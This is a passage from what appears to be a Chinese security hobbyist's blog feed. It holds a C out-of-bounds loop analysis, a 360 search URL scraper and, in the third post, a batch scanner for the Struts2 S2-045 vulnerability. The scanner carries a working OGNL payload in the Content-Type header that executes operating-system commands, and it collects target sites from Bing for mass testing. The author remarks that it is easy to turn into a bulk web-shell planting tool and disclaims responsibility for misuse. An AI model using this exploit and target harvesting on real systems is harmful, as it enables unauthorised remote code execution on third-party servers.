<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">HelloWorld</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">	<span class="keyword">int</span> a[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;;</div><div class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;=<span class="number">10</span>; i++)</div><div class="line">	&#123;</div><div class="line">		a[i] = <span class="number">0</span>;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Hello World!\n"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line">	HelloWorld();</div><div class="line">	getchar();</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>当你运行上面这串代码的时候，因为c语言并不会对数组越界进行检查，所以是不会报错可以直接运行的，那么是什么原因导致了下面这张图的结果呢？</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11551a36ea.gif" alt="GIF.gif"></p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>我们可以调试跟进看看，在HelloWorld函数上加一个断点跟进去看看</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11956dee36.png" alt="snipaste_20170309_165830.png"></p>
<p>这个函数主要的汇编代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">8:        int i = 0;</div><div class="line">00401038   mov         dword ptr [ebp-4],0</div><div class="line">9:        int a[] = &#123;1,2,3,4,5,6,7,8,9,10&#125;;</div><div class="line">0040103F   mov         dword ptr [ebp-2Ch],1</div><div class="line">00401046   mov         dword ptr [ebp-28h],2</div><div class="line">0040104D   mov         dword ptr [ebp-24h],3</div><div class="line">00401054   mov         dword ptr [ebp-20h],4</div><div class="line">0040105B   mov         dword ptr [ebp-1Ch],5</div><div class="line">00401062   mov         dword ptr [ebp-18h],6</div><div class="line">00401069   mov         dword ptr [ebp-14h],7</div><div class="line">00401070   mov         dword ptr [ebp-10h],8</div><div class="line">00401077   mov         dword ptr [ebp-0Ch],9</div><div class="line">0040107E   mov         dword ptr [ebp-8],0Ah</div><div class="line">10:       for(i=0; i&lt;=10; i++)</div><div class="line">00401085   mov         dword ptr [ebp-4],0</div><div class="line">0040108C   jmp         HelloWorld+77h (00401097)</div><div class="line">0040108E   mov         eax,dword ptr [ebp-4]</div><div class="line">00401091   add         eax,1</div><div class="line">00401094   mov         dword ptr [ebp-4],eax</div><div class="line">00401097   cmp         dword ptr [ebp-4],0Ah</div><div class="line">0040109B   jg          HelloWorld+97h (004010b7)</div><div class="line">11:       &#123;</div><div class="line">12:           a[i] = 0;</div><div class="line">0040109D   mov         ecx,dword ptr [ebp-4]</div><div class="line">004010A0   mov         dword ptr [ebp+ecx*4-2Ch],0</div><div class="line">13:           printf(&quot;Hello World!\n&quot;);</div><div class="line">004010A8   push        offset string &quot;Hello World!\n&quot; (0042301c)</div><div class="line">004010AD   call        printf (004011a0)</div><div class="line">004010B2   add         esp,4</div><div class="line">14:       &#125;</div><div class="line">004010B5   jmp         HelloWorld+6Eh (0040108e)</div><div class="line">15:   &#125;</div></pre></td></tr></table></figure></p>
<p>从<code>int i = 0;</code>开始看直到<code>for(i=0; i&lt;=10; i++)</code>的堆栈图是</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11ad728904.png" alt="snipaste_20170309_170508.png"></p>
<p>第一次进入循环开始先把0放到了[ebp-4]，然后跳到了<code>00401097   cmp dword ptr [ebp-4],0Ah</code>以及下面的jg，这里的意思是如果ebp-4中存放的值比0A大那么就执行<code>jg HelloWorld+97h (004010b7)</code>跳到004010b7函数结束<br>第一次进入循环时，cmp之后（ebp-4中存放的值比0A小）执行<code>0040109D</code>处的语句，此时<code>ECX</code>中的值变成了[ebp-4]中的值也就是0，然后<code>mov dword ptr [ebp+ecx*4-2Ch],0</code>将0放到<code>ebp+ecx*4-2Ch</code>处也就是<code>EBP-2C</code>处，下面的两条语句不用管是执行输出的，然后到了<code>add  esp,4</code>将栈顶的值加4，这里我们无需关注栈顶，然后<code>jmp HelloWorld+6Eh (0040108e)</code>跳回到<code>0040108e</code>继续执行</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11e41e5384.png" alt="snipaste_20170309_170508.png"></p>
<p>跳到<code>0040108E   mov  eax,dword ptr [ebp-4]</code>开始执行，紧接着这三条语句的作用是把<code>EBP-4</code>中的值加了1，也就是<code>EBP-4</code>中的值现在为1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mov eax,dword ptr [ebp-4]</div><div class="line">add eax,1</div><div class="line">mov dword ptr [ebp-4],eax</div></pre></td></tr></table></figure></p>
<p>cmp比较之后再次执行循环体，循环体完成后再次跳到<code>0040108e</code>，此时<code>EBP-28</code>的值变为了0，栈顶esp再次增加了4（这个例子中栈顶是不用关注的）</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11fe590ae4.png" alt="snipaste_20170309_172648.png"></p>
<p>紧接着下次执行后</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c1202d748a0.png" alt="snipaste_20170309_172805.png"></p>
<p>直到这个数组长度为10的数组执行到第十次</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c120f1a650e.png" alt="snipaste_20170309_173122.png"></p>
<p>此时再次跳转到<code>0040108e</code>，然后<code>EBP-4</code>中的值再次增加了1，现在也就是<code>EBP-4</code>中的值变为了0A，cmp比较之后<code>EBP-4</code>中的值依旧不比0A大，接着执行<code>mov ecx,dword ptr [ebp-4]</code>，此时ECX的值变成了0A，接着执行<code>mov dword ptr [ebp+ecx*4-2Ch],0</code>也就是<code>mov dword ptr [ebp-4],0</code></p>
<p>然后呢，你发现了什么？？？就是他喵的<code>EBP-4</code>中的值变成了0</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c12263d566e.png" alt="snipaste_20170309_173729.png"></p>
<p>变成0代表着什么？？？<code>EBP-4</code>中的值是我们拿来干嘛的？是用来和0A进行cmp然后决定是否结束函数的，可是我们辛辛苦苦循环了10次，第11次全泡汤了，唯一的变化就是数组都成了0，栈顶的值变化了不少，然后再次cmp的时候，0和0A比，决定了你还是要循环，不管多少次，最后都会把你用来计数的地址<code>EBP-4</code>中的值清零</p>
<p>这也就是为什么上面这段c语言代码会一直不停地循环的原因</p>
<p><strong>转载请注明出处</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对于下面这段c语言代码会一直不停地循环，为什么呢？&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;HelloWorld&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; a[] = &amp;#123;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;&amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i&amp;lt;=&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;; i++)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		a[i] = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Hello World!\n&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* argv[])&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	HelloWorld();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	getchar();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://akkuman.coding.me/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://akkuman.coding.me/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>360搜索引擎取真实地址-python代码</title>
    <link href="http://akkuman.coding.me/2017/03/08/360-Search-Engine-get-realURL-with-python.html"/>
    <id>http://akkuman.coding.me/2017/03/08/360-Search-Engine-get-realURL-with-python.html</id>
    <published>2017-03-08T13:12:59.000Z</published>
    <updated>2017-03-08T13:46:42.978Z</updated>
    
    <content type="html"><![CDATA[<p>还是个比较简单的，不像百度有加密算法</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.so.com/link?url=http%3A%2F%2Fedu.sd.chinamobile.com%2Findex%2Fnews.do%3Faction%3DnoticeDetail%26id%3D22452&amp;q=inurl%3Anews.do&amp;ts=1488978912&amp;t=89c5361a44fe3f52931d25c6de262bb&amp;src=haosou</div></pre></td></tr></table></figure>
<p>网址是上面这个样子，没加密直接取就好了，去掉头<code>http://www.so.com/link?url=</code>和尾<code>&amp;q=</code>一直到末尾的部分，剩下的就可以吃了<br><a id="more"></a><br>那么规则我们就可以写出来了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a[<span class="string">'href'</span>][a[<span class="string">'href'</span>].index(<span class="string">'?url='</span>):a[<span class="string">'href'</span>].index(<span class="string">'&amp;q='</span>)][<span class="number">5</span>:]</div></pre></td></tr></table></figure></p>
<p><code>a[&#39;href&#39;]</code>是待处理网址,<code>a[&#39;href&#39;].index(&#39;?url=&#39;):a[&#39;href&#39;].index(&#39;&amp;q=&#39;)</code>的部分为<code>?url=http%3A%2F%2Fedu.sd.chinamobile.com%2Findex%2Fnews.do%3Faction%3DnoticeDetail%26id%3D22452</code></p>
<p>最后还需要用unquote解码</p>
<ul>
<li>在python3中是<code>urllib.parse.unquote</code></li>
<li>在python2中是<code>urllib.unquote</code></li>
</ul>
<h1 id="code"><a href="#code" class="headerlink" title="code"></a>code</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</div><div class="line"></div><div class="line">headers = &#123;</div><div class="line">    <span class="string">"User-Agent"</span> : <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">#爬取360搜索引擎真实链接，第一个参数关键词str，第二个参数爬取页数int</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse360</span><span class="params">(keyword, pagenum)</span>:</span></div><div class="line">    keywordsBaseURL = <span class="string">'https://www.so.com/s?q='</span> + str(keyword) + <span class="string">'&amp;pn='</span></div><div class="line">    pnum = <span class="number">1</span></div><div class="line">    <span class="keyword">while</span> pnum &lt;= int(pagenum):</div><div class="line">        baseURL = keywordsBaseURL + str(pnum)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            request = requests.get(baseURL, headers=headers)</div><div class="line">            soup = BeautifulSoup(request.text, <span class="string">"html.parser"</span>)</div><div class="line">            urls = [unquote(a[<span class="string">'href'</span>][a[<span class="string">'href'</span>].index(<span class="string">'?url='</span>):a[<span class="string">'href'</span>].index(<span class="string">'&amp;q='</span>)][<span class="number">5</span>:]) <span class="keyword">for</span> a <span class="keyword">in</span> soup.select(<span class="string">'li.res-list &gt; h3 &gt; a'</span>)]</div><div class="line">            <span class="keyword">for</span> url <span class="keyword">in</span> urls:</div><div class="line">                <span class="keyword">yield</span> url</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">yield</span> <span class="keyword">None</span></div><div class="line">        <span class="keyword">finally</span>:</div><div class="line">            pnum += <span class="number">1</span></div></pre></td></tr></table></figure>
<p>用法示例:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> parse360(<span class="string">"keyword"</span>,<span class="number">10</span>):</div><div class="line">        <span class="keyword">if</span> url:</div><div class="line">            <span class="keyword">print</span> url</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">continue</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
<h1 id="最后上一张测试图"><a href="#最后上一张测试图" class="headerlink" title="最后上一张测试图"></a>最后上一张测试图</h1><p><img src="https://ooo.0o0.ooo/2017/03/08/58c009f5b3c1d.png" alt="snipaste_20170308_214047.png"></p>
<p><strong>转载请注明出处</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;还是个比较简单的，不像百度有加密算法&lt;/p&gt;
&lt;h1 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;http://www.so.com/link?url=http%3A%2F%2Fedu.sd.chinamobile.com%2Findex%2Fnews.do%3Faction%3DnoticeDetail%26id%3D22452&amp;amp;q=inurl%3Anews.do&amp;amp;ts=1488978912&amp;amp;t=89c5361a44fe3f52931d25c6de262bb&amp;amp;src=haosou&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;网址是上面这个样子，没加密直接取就好了，去掉头&lt;code&gt;http://www.so.com/link?url=&lt;/code&gt;和尾&lt;code&gt;&amp;amp;q=&lt;/code&gt;一直到末尾的部分，剩下的就可以吃了&lt;br&gt;
    
    </summary>
    
      <category term="Python" scheme="http://akkuman.coding.me/categories/Python/"/>
    
    
      <category term="Python" scheme="http://akkuman.coding.me/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>s2-045漏洞批量检测工具</title>
    <link href="http://akkuman.coding.me/2017/03/07/st2-045-batch-Test-Tool.html"/>
    <id>http://akkuman.coding.me/2017/03/07/st2-045-batch-Test-Tool.html</id>
    <published>2017-03-07T13:28:53.000Z</published>
    <updated>2017-03-08T12:55:31.778Z</updated>
    
    <content type="html"><![CDATA[<p>今天晚上看老铁们在群里就这个st2-045漏洞讨论得火热，个人不太喜欢日站，本来想直接写个批量挂马的东西，但是想想还是算了，如果你有兴趣，改改也很容易，反正不关我的事</p>
<p>测试图<br><img src="https://ooo.0o0.ooo/2017/03/07/58beb8f48f7df.png" alt="TIM图片20170307212124.png"><br><a id="more"></a></p>
<p><strong>2017-3-8更新</strong></p>
<ul>
<li>增加了对.do关键词的支持，并且支持任何关键词了，之前我只考虑到了.action关键词并且写死了规则，py版本已经更新，<del>win版的exe未更新，需要的自行用pyinstaller打包为exe</del></li>
<li>之前采用whoami如果返回200状态码就判断存在漏洞，但是现在很多已经修复了，导致访问之后依旧会跳到正常页面返回200状态码，于是我改了一下判断，执行命令echo xxxx，如果返回结果中含有xxxx就证明漏洞存在</li>
<li>win版exe已经打包</li>
<li><strong>重要：建议大家都使用py版本，经过群友测试，exe版本对中文关键词的支持不太好，会出现错误，如果使用上有问题可评论</strong></li>
<li><strong>exe版本会出现扫描过慢的情况，强烈建议py版本，鉴于有些朋友说不会配置python环境，我在下面给出了例子</strong></li>
<li><strong>有些朋友说自定义关键字字典出错，这里要提一句，你的字典txt的编码需要是utf-8，有些东西因为写的比较快没考虑太全，见谅</strong><br><img src="https://ooo.0o0.ooo/2017/03/08/58bf96eadc438.png" alt="TIM图片20170308132948.png"></li>
</ul>
<p><strong>依赖包的安装</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//首先你需要安装一个python，在安装图中记得把有pip的选项和add python to path类似的选项勾选上，然后安装完成后执行python -version和pip</div><div class="line">//如果执行python -version提醒你有问题，试着重启一下cmd或者电脑，或者检查你的path环境变量下有没有python的安装的路径，没有的话就加上</div><div class="line">//如果正常证明环境安装成功，如果执行pip提醒你没有pip，就把你python安装路径下的Scripts目录加到path环境变量，然后在命令行在执行以下代码</div><div class="line">pip install requests</div><div class="line">pip install beautifulsoup4</div></pre></td></tr></table></figure></p>
<p>对于此脚本所放置文件夹下必须有keyword.txt用来存放一行行的关键词<br>最开始是打算直接全部读取然后一个一个跑，不过感觉时间太漫长，测试时间太久<br>后来改成关键词就是自己输入，但是又感觉太麻烦<br>然后就变成了现在的读取关键词然后标号直接输入序号就可以<br>途中遇到了有的网址直接拒绝访问导致报错，还有的超时一直不返回报文，这些都解决了，个人测试的结果还可以，结果保存在一个txt下，至于你想再干些什么，不关我的事情了</p>
<p><strong>说明</strong><br>例子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python s2-045.py 9 10</div></pre></td></tr></table></figure></p>
<p>第一个参数是你的文件名，第二个是关键词所对应的序号，第三个是你需要爬行的页数<br>序号与关键词的对应，可以直接运行<code>python s2-045.py</code>就可以产看帮助<br>脚本采用的bing搜索引擎，<strong>文件我会打包在下面</strong></p>
<p>上代码,<strong>python2和3通用</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># encoding:utf-8</span></div><div class="line"><span class="keyword">import</span> sys,requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"></div><div class="line">keyword = &#123;&#125;</div><div class="line"><span class="keyword">with</span> open(<span class="string">"keyword.txt"</span>) <span class="keyword">as</span> f:</div><div class="line">    i = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> keywordLine <span class="keyword">in</span> f:</div><div class="line">        keyword[str(i)] = keywordLine.strip()</div><div class="line">        i += <span class="number">1</span></div><div class="line"></div><div class="line">usage = <span class="string">'''</span></div><div class="line">usage : python s2-045.py 0 10</div><div class="line"></div><div class="line">first parameter is your filename</div><div class="line">second parameter is your keyword's number which will be used by Bing</div><div class="line">Third parameter is the page number you want to crawl\n'''</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(actionURL)</span>:</span></div><div class="line">    data = <span class="string">'--447635f88b584ab6b8d9c17d04d79918\</span></div><div class="line">    Content-Disposition: form-data; name="image1"\</div><div class="line">    Content-Type: text/plain; charset=utf-8\</div><div class="line">    \</div><div class="line">    x\</div><div class="line">    --447635f88b584ab6b8d9c17d04d79918--'</div><div class="line">	</div><div class="line">    header = &#123;</div><div class="line">        <span class="string">"Content-Length"</span> : <span class="string">"155"</span>, </div><div class="line">        <span class="string">"User-Agent"</span> : <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>, </div><div class="line">        <span class="string">"Content-Type"</span> : <span class="string">"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo hereisaexp').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span>, </div><div class="line">    &#125;</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        request = requests.post(actionURL, data=data, headers=header, timeout = <span class="number">10</span>)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">"None"</span>, <span class="string">"Refused"</span></div><div class="line">    <span class="keyword">return</span> request.text, request.status_code</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">returnURLList</span><span class="params">()</span>:</span></div><div class="line">    keywordsBaseURL = <span class="string">'http://cn.bing.com/search?q='</span> +keyword[sys.argv[<span class="number">1</span>]]+ <span class="string">'&amp;first='</span></div><div class="line">    n =<span class="number">0</span></div><div class="line">    i = <span class="number">1</span></div><div class="line">    <span class="keyword">while</span> n &lt; int(sys.argv[<span class="number">2</span>]):</div><div class="line">        baseURL = keywordsBaseURL + str(i)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            req = requests.get(baseURL)</div><div class="line">            soup = BeautifulSoup(req.text, <span class="string">"html.parser"</span>)</div><div class="line">            text = soup.select(<span class="string">'li.b_algo &gt; h2 &gt; a'</span>)</div><div class="line">            <span class="keyword">if</span> <span class="string">'.action'</span> <span class="keyword">in</span> keyword[sys.argv[<span class="number">1</span>]]:</div><div class="line">                standardURL = [url[<span class="string">'href'</span>][:url[<span class="string">'href'</span>].index(<span class="string">'.action'</span>)]+<span class="string">'.action'</span> <span class="keyword">for</span> url <span class="keyword">in</span> text <span class="keyword">if</span> <span class="string">'.action'</span> <span class="keyword">in</span> url[<span class="string">'href'</span>]]</div><div class="line">            <span class="keyword">elif</span> <span class="string">'.do'</span> <span class="keyword">in</span> keyword[sys.argv[<span class="number">1</span>]]:</div><div 